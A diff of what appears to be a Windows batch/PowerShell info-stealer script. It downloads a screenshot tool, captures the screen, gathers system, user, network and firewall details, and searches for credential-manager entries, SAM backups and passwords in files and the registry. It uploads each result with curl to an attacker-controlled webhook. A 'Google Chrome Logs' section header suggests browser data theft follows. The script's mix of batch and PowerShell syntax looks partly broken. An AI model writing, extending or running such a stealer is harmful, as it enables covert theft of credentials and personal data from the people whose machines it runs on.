@@ -15,24 +15,14 @@ curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Ty
 curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s.exe
 .\s.exe -o %appdata%\s.png
 curl --silent --output /dev/null -F ss=@"%appdata%\s.png" %webhook%
-set "tempsys3=%appdata%\sysinfo.txt"
-set "tempsys1=%appdata%\whoami.txt"
-set "tempsys2=%appdata%\ipconfig.txt"
-set "tempsys4=%appdata%\dir.txt"
-set "tempsys0=%appdata%\netuser.txt"
-2>NUL net user > "%tempsys0%"
-2>NUL whoami > "%tempsys1%"
-2>NUL ipconfig > "%tempsys2%"
-2>NUL systeminfo > "%tempsys3%"
-2>NUL dir > "%tempsys4%"
 
-curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Device Info --------```\"}" %webhook%
+curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```############# Device Info ############```\"}" %webhook%
 
-curl --silent --output /dev/null -F dir=@"%tempsys0%" %webhook%
-curl --silent --output /dev/null -F dir=@"%tempsys1%" %webhook%
-curl --silent --output /dev/null -F dir=@"%tempsys2%" %webhook%
-curl --silent --output /dev/null -F dir=@"%tempsys3%" %webhook%
-curl --silent --output /dev/null -F dir=@"%tempsys4%" %webhook%
+$X="Basic-System-Information.txt","Environment-Variables.txt","Network-Information.txt","DNS-Servers.txt","ARP-cache.txt","Routing-Table.txt","Network-Connections.txt","Connected-Drives.txt","Firewall-Config.txt","Current-User.txt","User-Privileges.txt","Local-Users.txt","Logged-in-Users.txt","Credential-Manager.txt","User-Autologon-Registry-Items.txt","Local-Groups.txt","Local-Administrators.txt","User-Directories.txt","Searching-for-SAM-backup-files.txt","Running-Processes.txt","Installed-Software-Directories.txt","Software-in-Registry.txt","Folders-with-Everyone-Permissions.txt","Folders-with-BUILTIN-User-Permissions.txt","Checking-registry-for-AlwaysInstallElevated.txt","Scheduled-Tasks.txt","Startup-Commands.txt","Searching-for-files-with-passwords.txt","Searching-HKLM-for-passwords.txt","Searching-HKCU-for-passwords.txt"
+
+foreach ($file in $X) {
+    curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\$file" %webhook%
+}
 
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Google Chrome Logs --------```\"}" %webhook%
 
